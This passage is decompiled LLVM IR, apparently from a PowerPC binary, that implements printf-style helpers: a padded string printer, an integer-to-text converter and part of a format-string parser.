  %v2_10009ad426 = load i8, i8* %arg2, align 1
  %v3_10009adc29 = icmp eq i8 %v2_10009ad426, 0
  br i1 %v3_10009adc29, label %dec_label_pc_10009ae4, label %dec_label_pc_10009ab8

dec_label_pc_10009ab8:                            ; preds = %dec_label_pc_10009aa4, %dec_label_pc_10009ab8
  %v4_10009ad031 = phi i32 [ %v1_10009ac8, %dec_label_pc_10009ab8 ], [ %tmp, %dec_label_pc_10009aa4 ]
  %stack_var_-20.030 = phi i32 [ %v1_10009abc, %dec_label_pc_10009ab8 ], [ 0, %dec_label_pc_10009aa4 ]
  %v1_10009abc = add i32 %stack_var_-20.030, 1
  %v1_10009ac8 = add i32 %v4_10009ad031, 1
  %v5_10009acc = inttoptr i32 %v1_10009ac8 to i8*
  %v2_10009ad4 = load i8, i8* %v5_10009acc, align 1
  %v3_10009adc = icmp eq i8 %v2_10009ad4, 0
  br i1 %v3_10009adc, label %dec_label_pc_10009ae4, label %dec_label_pc_10009ab8

dec_label_pc_10009ae4:                            ; preds = %dec_label_pc_10009ab8, %dec_label_pc_10009aa4
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10009aa4 ], [ %v1_10009abc, %dec_label_pc_10009ab8 ]
  %v2_10009aec = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_10009aec, label %dec_label_pc_10009b00, label %dec_label_pc_10009b10

dec_label_pc_10009b00:                            ; preds = %dec_label_pc_10009ae4
  %v2_10009b08 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10009b10

dec_label_pc_10009b10:                            ; preds = %dec_label_pc_10009ae4, %dec_label_pc_10009b00
  %storemerge3 = phi i32 [ %v2_10009b08, %dec_label_pc_10009b00 ], [ 0, %dec_label_pc_10009ae4 ]
  %v1_10009b14 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10009b18 = icmp eq i32 %v1_10009b14, 0
  br i1 %v3_10009b18, label %dec_label_pc_10009b28, label %dec_label_pc_10009b20

dec_label_pc_10009b20:                            ; preds = %dec_label_pc_10009b10
  br label %dec_label_pc_10009b28

dec_label_pc_10009b28:                            ; preds = %dec_label_pc_10009b10, %entry, %dec_label_pc_10009b20
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_10009b10 ], [ %storemerge3, %dec_label_pc_10009b20 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10009b10 ], [ 48, %dec_label_pc_10009b20 ]
  %v1_10009b2c = urem i32 %arg4, 2
  %v3_10009b30 = icmp eq i32 %v1_10009b2c, 0
  br i1 %v3_10009b30, label %dec_label_pc_10009b60.preheader, label %dec_label_pc_10009ba0.preheader

dec_label_pc_10009b60.preheader:                  ; preds = %dec_label_pc_10009b28
  %v2_10009b6419 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_10009b6419, label %dec_label_pc_10009b3c.lr.ph, label %dec_label_pc_10009ba0.preheader

dec_label_pc_10009b3c.lr.ph:                      ; preds = %dec_label_pc_10009b60.preheader
  %v2_10009b44 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10009b3c

dec_label_pc_10009b3c:                            ; preds = %dec_label_pc_10009b3c.lr.ph, %dec_label_pc_10009b3c
  %stack_var_-32.122 = phi i32 [ %stack_var_-32.0, %dec_label_pc_10009b3c.lr.ph ], [ %v1_10009b58, %dec_label_pc_10009b3c ]
  %v3_10009b44 = call i32 @printchar(i32* %v2_10009b44, i32 %stack_var_-16.0)
  %v1_10009b58 = add nsw i32 %stack_var_-32.122, -1
  %v2_10009b64 = icmp sgt i32 %stack_var_-32.122, 1
  br i1 %v2_10009b64, label %dec_label_pc_10009b3c, label %dec_label_pc_10009ba0.preheader

dec_label_pc_10009ba0.preheader:                  ; preds = %dec_label_pc_10009b3c, %dec_label_pc_10009b60.preheader, %dec_label_pc_10009b28
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10009b28 ], [ 0, %dec_label_pc_10009b60.preheader ], [ %stack_var_-32.0, %dec_label_pc_10009b3c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10009b28 ], [ %stack_var_-32.0, %dec_label_pc_10009b60.preheader ], [ 0, %dec_label_pc_10009b3c ]
  %v2_10009ba410 = load i8, i8* %arg2, align 1
  %v3_10009bac13 = icmp eq i8 %v2_10009ba410, 0
  br i1 %v3_10009bac13, label %dec_label_pc_10009bdc.preheader, label %dec_label_pc_10009b70.lr.ph

dec_label_pc_10009b70.lr.ph:                      ; preds = %dec_label_pc_10009ba0.preheader
  %v2_10009b84 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10009b70

dec_label_pc_10009b70:                            ; preds = %dec_label_pc_10009b70.lr.ph, %dec_label_pc_10009b70
  %v4_10009ba016 = phi i32 [ %tmp, %dec_label_pc_10009b70.lr.ph ], [ %v1_10009b98, %dec_label_pc_10009b70 ]
  %stack_var_-36.015 = phi i8* [ %arg2, %dec_label_pc_10009b70.lr.ph ], [ %v5_10009b9c, %dec_label_pc_10009b70 ]
  %stack_var_-12.114 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10009b70.lr.ph ], [ %v1_10009b8c, %dec_label_pc_10009b70 ]
  %v2_10009b74 = load i8, i8* %stack_var_-36.015, align 1
  %v3_10009b74 = zext i8 %v2_10009b74 to i32
  %v3_10009b84 = call i32 @printchar(i32* %v2_10009b84, i32 %v3_10009b74)
  %v1_10009b8c = add i32 %stack_var_-12.114, 1
  %v1_10009b98 = add i32 %v4_10009ba016, 1
  %v5_10009b9c = inttoptr i32 %v1_10009b98 to i8*
  %v2_10009ba4 = load i8, i8* %v5_10009b9c, align 1
  %v3_10009bac = icmp eq i8 %v2_10009ba4, 0
  br i1 %v3_10009bac, label %dec_label_pc_10009bdc.preheader, label %dec_label_pc_10009b70

dec_label_pc_10009bdc.preheader:                  ; preds = %dec_label_pc_10009b70, %dec_label_pc_10009ba0.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10009ba0.preheader ], [ %v1_10009b8c, %dec_label_pc_10009b70 ]
  %v2_10009be05 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_10009be05, label %dec_label_pc_10009bb8.lr.ph, label %dec_label_pc_10009be8

dec_label_pc_10009bb8.lr.ph:                      ; preds = %dec_label_pc_10009bdc.preheader
  %v2_10009bc0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10009bb8

dec_label_pc_10009bb8:                            ; preds = %dec_label_pc_10009bb8.lr.ph, %dec_label_pc_10009bb8
  %stack_var_-32.38 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_10009bb8.lr.ph ], [ %v1_10009bd4, %dec_label_pc_10009bb8 ]
  %v3_10009bc0 = call i32 @printchar(i32* %v2_10009bc0, i32 %stack_var_-16.0)
  %v1_10009bd4 = add nsw i32 %stack_var_-32.38, -1
  %v2_10009be0 = icmp sgt i32 %stack_var_-32.38, 1
  br i1 %v2_10009be0, label %dec_label_pc_10009bb8, label %dec_label_pc_10009bdc.dec_label_pc_10009be8_crit_edge

dec_label_pc_10009bdc.dec_label_pc_10009be8_crit_edge: ; preds = %dec_label_pc_10009bb8
  %tmp46 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_10009be8

dec_label_pc_10009be8:                            ; preds = %dec_label_pc_10009bdc.dec_label_pc_10009be8_crit_edge, %dec_label_pc_10009bdc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp46, %dec_label_pc_10009bdc.dec_label_pc_10009be8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_10009bdc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10009b98, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_10009ac8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10009b70, { 1, 0 }
  uselistorder label %dec_label_pc_10009b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10009b28, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009b10, { 1, 0 }
  uselistorder label %dec_label_pc_10009ab8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10009c54 = icmp eq i32 %arg2, 0
  br i1 %v3_10009c54, label %dec_label_pc_10009c5c, label %dec_label_pc_10009c90

dec_label_pc_10009c5c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10009c80 = bitcast i32* %stack_var_-88 to i8*
  %v5_10009c80 = call i32 @prints(i32 %arg1, i8* %v4_10009c80, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_10009de8

dec_label_pc_10009c90:                            ; preds = %entry
  %v3_10009c94 = icmp eq i32 %arg4, 0
  br i1 %v3_10009c94, label %dec_label_pc_10009cc8, label %dec_label_pc_10009c9c

dec_label_pc_10009c9c:                            ; preds = %dec_label_pc_10009c90
  %v3_10009ca0 = icmp eq i32 %arg3, 10
  br i1 %v3_10009ca0, label %dec_label_pc_10009ca8, label %dec_label_pc_10009cc8

dec_label_pc_10009ca8:                            ; preds = %dec_label_pc_10009c9c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_10009cc8, label %dec_label_pc_10009cb4

dec_label_pc_10009cb4:                            ; preds = %dec_label_pc_10009ca8
  %v1_10009cc0 = sub i32 0, %arg2
  br label %dec_label_pc_10009cc8

dec_label_pc_10009cc8:                            ; preds = %dec_label_pc_10009c9c, %dec_label_pc_10009ca8, %dec_label_pc_10009c90, %dec_label_pc_10009cb4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10009c90 ], [ %arg2, %dec_label_pc_10009ca8 ], [ %v1_10009cc0, %dec_label_pc_10009cb4 ], [ %arg2, %dec_label_pc_10009c9c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10009c90 ], [ 0, %dec_label_pc_10009ca8 ], [ 1, %dec_label_pc_10009cb4 ], [ 0, %dec_label_pc_10009c9c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_10009d545 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_10009d545, label %dec_label_pc_10009d5c, label %dec_label_pc_10009ce0.lr.ph

dec_label_pc_10009ce0.lr.ph:                      ; preds = %dec_label_pc_10009cc8
  %v2_10009d10 = add i32 %arg7, -58
  br label %dec_label_pc_10009ce0

dec_label_pc_10009ce0:                            ; preds = %dec_label_pc_10009ce0.lr.ph, %dec_label_pc_10009d1c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_10009ce0.lr.ph ], [ %v2_10009d48, %dec_label_pc_10009d1c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_10009ce0.lr.ph ], [ %v5_10009d24, %dec_label_pc_10009d1c ]
  %v2_10009ce8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_10009ce8, 10
  br i1 %tmp29, label %dec_label_pc_10009d1c, label %dec_label_pc_10009d08

dec_label_pc_10009d08:                            ; preds = %dec_label_pc_10009ce0
  %v1_10009d14 = add i32 %v2_10009d10, %v2_10009ce8
  br label %dec_label_pc_10009d1c

dec_label_pc_10009d1c:                            ; preds = %dec_label_pc_10009ce0, %dec_label_pc_10009d08
  %stack_var_-32.0 = phi i32 [ %v2_10009ce8, %dec_label_pc_10009ce0 ], [ %v1_10009d14, %dec_label_pc_10009d08 ]
  %v4_10009d1c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10009d20 = add i32 %v4_10009d1c, -1
  %v5_10009d24 = inttoptr i32 %v1_10009d20 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_10009d3c = trunc i32 %fold to i8
  store i8 %v1_10009d3c, i8* %v5_10009d24, align 1
  %v2_10009d48 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10009d54 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10009d54, label %dec_label_pc_10009d5c, label %dec_label_pc_10009ce0

dec_label_pc_10009d5c:                            ; preds = %dec_label_pc_10009d1c, %dec_label_pc_10009cc8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_10009cc8 ], [ %v5_10009d24, %dec_label_pc_10009d1c ]
  %v3_10009d60 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10009d60, label %dec_label_pc_10009dc4, label %dec_label_pc_10009d68

dec_label_pc_10009d68:                            ; preds = %dec_label_pc_10009d5c
  %v3_10009d6c = icmp eq i32 %arg5, 0
  br i1 %v3_10009d6c, label %dec_label_pc_10009dac, label %dec_label_pc_10009d74

dec_label_pc_10009d74:                            ; preds = %dec_label_pc_10009d68
  %v1_10009d78 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_10009d7c = icmp eq i32 %v1_10009d78, 0
  br i1 %v3_10009d7c, label %dec_label_pc_10009dac, label %dec_label_pc_10009d84

dec_label_pc_10009d84:                            ; preds = %dec_label_pc_10009d74
  %v2_10009d8c = inttoptr i32 %arg1 to i32*
  %v3_10009d8c = call i32 @printchar(i32* %v2_10009d8c, i32 45)
  %v1_10009da0 = add i32 %arg5, -1
  br label %dec_label_pc_10009dc4

dec_label_pc_10009dac:                            ; preds = %dec_label_pc_10009d74, %dec_label_pc_10009d68
  %v4_10009dac = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_10009db0 = add i32 %v4_10009dac, -1
  %v5_10009db4 = inttoptr i32 %v1_10009db0 to i8*
  store i8 45, i8* %v5_10009db4, align 1
  br label %dec_label_pc_10009dc4

dec_label_pc_10009dc4:                            ; preds = %dec_label_pc_10009d5c, %dec_label_pc_10009d84, %dec_label_pc_10009dac
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_10009d5c ], [ %v5_10009db4, %dec_label_pc_10009dac ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10009d84 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_10009d5c ], [ %arg5, %dec_label_pc_10009dac ], [ %v1_10009da0, %dec_label_pc_10009d84 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_10009d5c ], [ 0, %dec_label_pc_10009dac ], [ 1, %dec_label_pc_10009d84 ]
  %v5_10009dd4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_10009de0 = add i32 %v5_10009dd4, %stack_var_-40.0
  br label %dec_label_pc_10009de8

dec_label_pc_10009de8:                            ; preds = %dec_label_pc_10009c5c, %dec_label_pc_10009dc4
  %storemerge = phi i32 [ %v2_10009de0, %dec_label_pc_10009dc4 ], [ %v5_10009c80, %dec_label_pc_10009c5c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10009d24, { 0, 2, 1 }
  uselistorder i32 %v2_10009ce8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2, 3 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009de8, { 1, 0 }
  uselistorder label %dec_label_pc_10009dc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10009d1c, { 1, 0 }
  uselistorder label %dec_label_pc_10009ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10009cc8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_1000a3d828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_1000a3e031 = icmp eq i8 %v2_1000a3d828, 0
  br i1 %v3_1000a3e031, label %dec_label_pc_1000a3e8, label %dec_label_pc_10009e34.lr.ph

dec_label_pc_10009e34.lr.ph:                      ; preds = %entry
  %v1_10009fa8 = add i32 %arg3, 4
  %v2_10009fa8 = inttoptr i32 %v1_10009fa8 to i32*
  %v1_10009f70 = add i32 %arg3, 8
  %v2_10009f70 = inttoptr i32 %v1_10009f70 to i32*
  %v4_1000a38c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10009e34

dec_label_pc_10009e34:                            ; preds = %dec_label_pc_10009e34.lr.ph, %dec_label_pc_1000a3c8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10009e34.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_1000a3c8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10009e34.lr.ph ], [ %v1_1000a3cc, %dec_label_pc_1000a3c8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10009e34.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_1000a3c8 ]
  %v2_10009e38 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10009e40 = icmp eq i8 %v2_10009e38, 37
  br i1 %v3_10009e40, label %dec_label_pc_10009e48, label %dec_label_pc_1000a3a4

dec_label_pc_10009e48:                            ; preds = %dec_label_pc_10009e34
  %v1_10009e4c = add i32 %stack_var_-68.4.in33, 1
  %v5_10009e50 = inttoptr i32 %v1_10009e4c to i8*
  %v2_10009e68 = load i8, i8* %v5_10009e50, align 1
  %v3_10009e70 = icmp eq i8 %v2_10009e68, 0
  br i1 %v3_10009e70, label %dec_label_pc_1000a3e8, label %dec_label_pc_10009e78

dec_label_pc_10009e78:                            ; preds = %dec_label_pc_10009e48
  %v2_10009e7c = load i8, i8* %v5_10009e50, align 1
  %v3_10009e84 = icmp eq i8 %v2_10009e7c, 37
  br i1 %v3_10009e84, label %dec_label_pc_1000a3a4, label %dec_label_pc_10009e8c

dec_label_pc_10009e8c:                            ; preds = %dec_label_pc_10009e78
  %v2_10009e90 = load i8, i8* %v5_10009e50, align 1
  %v3_10009e98 = icmp eq i8 %v2_10009e90, 45
  br i1 %v3_10009e98, label %dec_label_pc_10009ea0, label %dec_label_pc_10009ed0.preheader

dec_label_pc_10009ea0:                            ; preds = %dec_label_pc_10009e8c
  %v1_10009ea4 = add i32 %stack_var_-68.4.in33, 2
  %v5_10009ea8 = inttoptr i32 %v1_10009ea4 to i8*
  br label %dec_label_pc_10009ed0.preheader

dec_label_pc_10009ed0.preheader:                  ; preds = %dec_label_pc_10009ea0, %dec_label_pc_10009e8c
  %stack_var_-68.0.ph = phi i8* [ %v5_10009e50, %dec_label_pc_10009e8c ], [ %v5_10009ea8, %dec_label_pc_10009ea0 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10009e8c ], [ 1, %dec_label_pc_10009ea0 ]
  %v4_10009ed03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10009ed44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10009edc8 = icmp eq i8 %v2_10009ed44, 48
  br i1 %v3_10009edc8, label %dec_label_pc_10009eb8, label %dec_label_pc_10009f1c.preheader

dec_label_pc_10009eb8:                            ; preds = %dec_label_pc_10009ed0.preheader, %dec_label_pc_10009eb8
  %v4_10009ed010 = phi i32 [ %v1_10009ebc, %dec_label_pc_10009eb8 ], [ %v4_10009ed03, %dec_label_pc_10009ed0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10009ec8, %dec_label_pc_10009eb8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10009ed0.preheader ]
  %v1_10009ebc = add i32 %v4_10009ed010, 1
  %v5_10009ec0 = inttoptr i32 %v1_10009ebc to i8*
  %v1_10009ec8 = or i32 %stack_var_-52.09, 2
  %v2_10009ed4 = load i8, i8* %v5_10009ec0, align 1
  %v3_10009edc = icmp eq i8 %v2_10009ed4, 48
  br i1 %v3_10009edc, label %dec_label_pc_10009eb8, label %dec_label_pc_10009f1c.preheader

dec_label_pc_10009f1c.preheader:                  ; preds = %dec_label_pc_10009eb8, %dec_label_pc_10009ed0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10009ed0.preheader ], [ %v1_10009ec8, %dec_label_pc_10009eb8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10009ed0.preheader ], [ %v5_10009ec0, %dec_label_pc_10009eb8 ]
  %v4_10009f1c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10009f2013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10009f2013, 48
  br i1 %tmp62, label %dec_label_pc_10009f44, label %dec_label_pc_10009f30

dec_label_pc_10009ee8:                            ; preds = %dec_label_pc_10009f30
  %v1_10009eec = mul i32 %stack_var_-48.018, 10
  %v2_10009ef8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10009ef8 = zext i8 %v2_10009ef8 to i32
  %v2_10009f04 = add i32 %v1_10009eec, -48
  %v1_10009f08 = add i32 %v2_10009f04, %v3_10009ef8
  %v1_10009f14 = add i32 %v4_10009f1c20, 1
  %v5_10009f18 = inttoptr i32 %v1_10009f14 to i8*
  %v2_10009f20 = load i8, i8* %v5_10009f18, align 1
  %tmp63 = icmp ult i8 %v2_10009f20, 48
  br i1 %tmp63, label %dec_label_pc_10009f44, label %dec_label_pc_10009f30

dec_label_pc_10009f30:                            ; preds = %dec_label_pc_10009f1c.preheader, %dec_label_pc_10009ee8
  %v4_10009f1c20 = phi i32 [ %v1_10009f14, %dec_label_pc_10009ee8 ], [ %v4_10009f1c12, %dec_label_pc_10009f1c.preheader ]
  %stack_var_-68.119 = phi i8* [ %v5_10009f18, %dec_label_pc_10009ee8 ], [ %stack_var_-68.0.lcssa, %dec_label_pc_10009f1c.preheader ]
  %stack_var_-48.018 = phi i32 [ %v1_10009f08, %dec_label_pc_10009ee8 ], [ 0, %dec_label_pc_10009f1c.preheader ]
  %v2_10009f34 = load i8, i8* %stack_var_-68.119, align 1
  %tmp64 = icmp ult i8 %v2_10009f34, 58
  br i1 %tmp64, label %dec_label_pc_10009ee8, label %dec_label_pc_10009f44

dec_label_pc_10009f44:                            ; preds = %dec_label_pc_10009ee8, %dec_label_pc_10009f30, %dec_label_pc_10009f1c.preheader
  %stack_var_-48.0.lcssa = phi i32 [ 0, %dec_label_pc_10009f1c.preheader ], [ %v1_10009f08, %dec_label_pc_10009ee8 ], [ %stack_var_-48.018, %dec_label_pc_10009f30 ]
  %stack_var_-68.1.lcssa = phi i8* [ %stack_var_-68.0.lcssa, %dec_label_pc_10009f1c.preheader ], [ %v5_10009f18, %dec_label_pc_10009ee8 ], [ %stack_var_-68.119, %dec_label_pc_10009f30 ]
  %v2_10009f48 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_10009f50 = icmp eq i8 %v2_10009f48, 115
  br i1 %v3_10009f50, label %dec_label_pc_10009f58, label %dec_label_pc_1000a018

dec_label_pc_10009f58:                            ; preds = %dec_label_pc_10009f44
  %v2_10009f5c = load i8, i8* %tmp, align 1
  %tmp65 = icmp ugt i8 %v2_10009f5c, 7
  br i1 %tmp65, label %dec_label_pc_10009fa4, label %dec_label_pc_10009f6c

dec_label_pc_10009f6c:                            ; preds = %dec_label_pc_10009f58
  %v3_10009f70 = load i32, i32* %v2_10009f70, align 4
  %v2_10009f78 = load i8, i8* %tmp, align 1
  %v3_10009f78 = zext i8 %v2_10009f78 to i32
  %v1_10009f84 = mul nuw nsw i32 %v3_10009f78, 4
  %v2_10009f88 = add i32 %v1_10009f84, %v3_10009f70
  %v1_10009f90 = add i8 %v2_10009f78, 1
  store i8 %v1_10009f90, i8* %tmp, align 1
  br label %dec_label_pc_10009fbc

dec_label_pc_10009fa4:                            ; preds = %dec_label_pc_10009f58
  %v3_10009fa8 = load i32, i32* %v2_10009fa8, align 4
  %v1_10009fb0 = add i32 %v3_10009fa8, 4
  store i32 %v1_10009fb0, i32* %v2_10009fa8, align 4
  br label %dec_label_pc_10009fbc

dec_label_pc_10009fbc:                            ; preds = %dec_label_pc_10009f6c, %dec_label_pc_10009fa4
  %stack_var_-20.0 = phi i32 [ %v3_10009fa8, %dec_label_pc_10009fa4 ], [ %v2_10009f88, %dec_label_pc_10009f6c ]
  %v1_10009fc0 = inttoptr i32 %stack_var_-20.0 to i32*
  %v2_10009fc0 = load i32, i32* %v1_10009fc0, align 4
  %v3_10009fcc = icmp eq i32 %v2_10009fc0, 0
  br i1 %v3_10009fcc, label %dec_label_pc_10009fe0, label %dec_label_pc_10009fd4

dec_label_pc_10009fd4:                            ; preds = %dec_label_pc_10009fbc
  %v5_10009fd8 = inttoptr i32 %v2_10009fc0 to i8*
  br label %dec_label_pc_10009fec

dec_label_pc_10009fe0:                            ; preds = %dec_label_pc_10009fbc
  br label %dec_label_pc_10009fec

dec_label_pc_10009fec:                            ; preds = %dec_label_pc_10009fd4, %dec_label_pc_10009fe0
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1002ba00.465, i32 0, i32 0), %dec_label_pc_10009fe0 ], [ %v5_10009fd8, %dec_label_pc_10009fd4 ]
  %v6_1000a000 = call i32 @prints(i32 %tmp41, i8* %storemerge, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa)
  %v2_1000a00c = add i32 %v6_1000a000, %stack_var_-56.132
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a018:                            ; preds = %dec_label_pc_10009f44
  %v2_1000a01c = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a024 = icmp eq i8 %v2_1000a01c, 100
  br i1 %v3_1000a024, label %dec_label_pc_1000a02c, label %dec_label_pc_1000a0cc

dec_label_pc_1000a02c:                            ; preds = %dec_label_pc_1000a018
  %v2_1000a030 = load i8, i8* %tmp, align 1
  %tmp66 = icmp ugt i8 %v2_1000a030, 7
  br i1 %tmp66, label %dec_label_pc_1000a078, label %dec_label_pc_1000a040

dec_label_pc_1000a040:                            ; preds = %dec_label_pc_1000a02c
  %v3_1000a044 = load i32, i32* %v2_10009f70, align 4
  %v2_1000a04c = load i8, i8* %tmp, align 1
  %v3_1000a04c = zext i8 %v2_1000a04c to i32
  %v1_1000a058 = mul nuw nsw i32 %v3_1000a04c, 4
  %v2_1000a05c = add i32 %v1_1000a058, %v3_1000a044
  %v1_1000a064 = add i8 %v2_1000a04c, 1
  store i8 %v1_1000a064, i8* %tmp, align 1
  br label %dec_label_pc_1000a090

dec_label_pc_1000a078:                            ; preds = %dec_label_pc_1000a02c
  %v3_1000a07c = load i32, i32* %v2_10009fa8, align 4
  %v1_1000a084 = add i32 %v3_1000a07c, 4
  store i32 %v1_1000a084, i32* %v2_10009fa8, align 4
  br label %dec_label_pc_1000a090

dec_label_pc_1000a090:                            ; preds = %dec_label_pc_1000a040, %dec_label_pc_1000a078
  %stack_var_-28.0 = phi i32 [ %v3_1000a07c, %dec_label_pc_1000a078 ], [ %v2_1000a05c, %dec_label_pc_1000a040 ]
  %v1_1000a094 = inttoptr i32 %stack_var_-28.0 to i32*
  %v2_1000a094 = load i32, i32* %v1_1000a094, align 4
  %v7_1000a0b4 = call i32 @printi(i32 %tmp41, i32 %v2_1000a094, i32 10, i32 1, i32 %stack_var_-48.0.lcssa, i32 %stack_var_-52.0.lcssa, i32 97)
  %v2_1000a0c0 = add i32 %v7_1000a0b4, %stack_var_-56.132
  br label %dec_label_pc_1000a3c8

dec_label_pc_1000a0cc:                            ; preds = %dec_label_pc_1000a018
  %v2_1000a0d0 = load i8, i8* %stack_var_-68.1.lcssa, align 1
  %v3_1000a0d8 = icmp eq i8 %v2_1000a0d0, 120
  br i1 %v3_1000a0d8, label %dec_label_pc_1000a0e0, label %dec_label_pc_1000a180

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_1000a0cc
  %v2_1000a0e4 = load i8, i8* %tmp, align 1
  %tmp67 = icmp ugt i8 %v2_1000a0e4, 7
  br i1 %tmp67, label %dec_label_pc_1000a12c, label %dec_label_pc_1000a0f4

dec_label_pc_1000a0f4:                            ; preds = %dec_label_pc_1000a0e0
  %v3_1000a0f8 = load i32, i32* %v2_10009f70, align 4
  %v2_1000a100 = load i8, i8* %tmp, align 1
  %v3_1000a100 = zext i8 %v2_1000a100 to i32
  %v1_1000a10c = mul nuw nsw i32 %v3_1000a100, 4
  %v2_1000a110 = add i32 %v1_1000a10c, %v3_1000a0f8
  %v1_1000a118 = add i8 %v2_1000a100, 1
